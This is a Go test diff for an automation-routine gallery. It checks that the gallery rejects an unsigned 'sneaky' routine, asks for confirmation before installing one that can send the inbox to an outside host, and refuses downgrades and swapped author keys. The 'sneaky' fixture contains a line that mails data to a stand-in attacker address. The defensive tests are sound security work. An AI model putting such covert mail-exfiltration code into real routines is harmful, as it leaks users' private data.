@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/turbine-dev/pimpo/internal/gallery"
@@ -24,10 +25,17 @@ func TestGalleryInstallAndPublish(t *testing.T) {
 	sneaky := good
 	sneaky.Name = "Bom dia (sneaky)"
 	sneaky.Code = `async function run() { await telegram.send({text: "Bom dia!"}); await gmail.send({to: "x@evil.example", subject: "s", body: "b"}) }`
+	// Reads the inbox and may reach a host outside: it could send the
+	// inbox away, so installing it takes a confirmation.
+	leaky := routine.Routine{Name: "Resumo", Description: "Resume a caixa de entrada.",
+		Manifest: runtime.Manifest{Schedule: "0 7 * * *", Capabilities: []string{"gmail.search", "http.getJSON:api.example.net", "telegram.send"}},
+		Code:     `async function run() { const m = await gmail.search({query: "is:unread"}); await telegram.send({text: m.length + " novos"}) }`,
+		Tests:    []routine.Test{{Name: "conta", Scenario: trace.Scenario{Responses: []trace.Response{{Capability: "gmail.search", Result: json.RawMessage(`[{"id":"1"}]`)}}, Expect: []trace.Expect{{Capability: "telegram.send", Contains: []string{"1 novos"}}}}}}}
 	pub, priv, _ := gallery.Keygen()
 	e1, _ := gallery.Sign("bom-dia", "dener", good, priv)
 	e2, _ := gallery.Sign("sneaky", "dener", sneaky, priv)
-	ix := gallery.Index{Authors: map[string]gallery.Author{"dener": {Name: "Dener", Key: pub}}, Entries: []gallery.Entry{e1, e2}}
+	e3, _ := gallery.Sign("leaky", "dener", leaky, priv)
+	ix := gallery.Index{Authors: map[string]gallery.Author{"dener": {Name: "Dener", Key: pub}}, Entries: []gallery.Entry{e1, e2, e3}}
 	path := filepath.Join(t.TempDir(), "index.json")
 	b, _ := json.Marshal(ix)
 	os.WriteFile(path, b, 0o644)
@@ -37,7 +45,7 @@ func TestGalleryInstallAndPublish(t *testing.T) {
 
 	_, out := ta.do(t, "GET", "/api/gallery?fresh=1", nil)
 	list := out["list"].([]any)
-	if len(list) != 2 || list[0].(map[string]any)["report"].(map[string]any)["verified"] != true || list[1].(map[string]any)["report"].(map[string]any)["verified"] != false {
+	if len(list) != 3 || list[0].(map[string]any)["report"].(map[string]any)["verified"] != true || list[1].(map[string]any)["report"].(map[string]any)["verified"] != false {
 		t.Fatalf("gallery %v", list)
 	}
 	if code, _ := ta.do(t, "POST", "/api/gallery/sneaky/install", nil); code != 422 {
@@ -45,6 +53,15 @@ func TestGalleryInstallAndPublish(t *testing.T) {
 	}
 	if code, out := ta.do(t, "POST", "/api/gallery/bom-dia/install", nil); code != 200 || out["id"] != "bom-dia" {
 		t.Fatalf("install %d %v", code, out)
+	}
+	if rep := list[2].(map[string]any)["report"].(map[string]any); rep["verified"] != true || rep["sends"] != true {
+		t.Fatalf("leaky report %v", rep)
+	}
+	if code, _ := ta.do(t, "POST", "/api/gallery/leaky/install", nil); code != 409 {
+		t.Fatalf("installed a routine that can send the inbox out without confirming: %d", code)
+	}
+	if code, out := ta.do(t, "POST", "/api/gallery/leaky/install", map[string]bool{"confirm": true}); code != 200 {
+		t.Fatalf("confirmed install %d %v", code, out)
 	}
 	_, out = ta.do(t, "GET", "/api/gallery", nil)
 	if out["list"].([]any)[0].(map[string]any)["installed"] != true {
@@ -116,6 +133,26 @@ func TestGalleryUpdateKeepsTheOwnersSettings(t *testing.T) {
 	}
 	if code, _ := ta.do(t, "PUT", "/api/routines/clima/settings", map[string]any{"schedule": "22 10 * * *", "params": map[string]any{"cidade": map[string]any{"name": "Lisboa", "latitude": 38.7, "longitude": -9.1}}}); code != 200 {
 		t.Fatal("could not change the city after updating")
+	}
+
+	// The index cannot take the routine back to an older version...
+	publish(old)
+	if code, out := ta.do(t, "POST", "/api/routines/clima/update", nil); code != 422 || !strings.Contains(out["error"].(string), "older version") {
+		t.Fatalf("downgrade %d %v", code, out)
+	}
+	// ...nor swap in another key for the same author.
+	pub2, priv2, _ := gallery.Keygen()
+	newer := updated
+	newer.Description = "Agora com chuva."
+	e, _ := gallery.Sign("clima", "dener", newer, priv2)
+	other, _ := gallery.Sign("outra", "dener", old, priv2)
+	b, _ := json.Marshal(gallery.Index{Authors: map[string]gallery.Author{"dener": {Name: "Dener", Key: pub2}}, Entries: []gallery.Entry{e, other}})
+	os.WriteFile(path, b, 0o644)
+	if code, out := ta.do(t, "POST", "/api/routines/clima/update", nil); code != 422 || !strings.Contains(out["error"].(string), "different key") {
+		t.Fatalf("swapped key on update %d %v", code, out)
+	}
+	if code, out := ta.do(t, "POST", "/api/gallery/outra/install", nil); code != 422 || !strings.Contains(out["error"].(string), "different key") {
+		t.Fatalf("swapped key on install %d %v", code, out)
 	}
 
 	ta.Store.SaveRoutine(ctx, "mine", old, "compiled from exploration x", "human:owner")
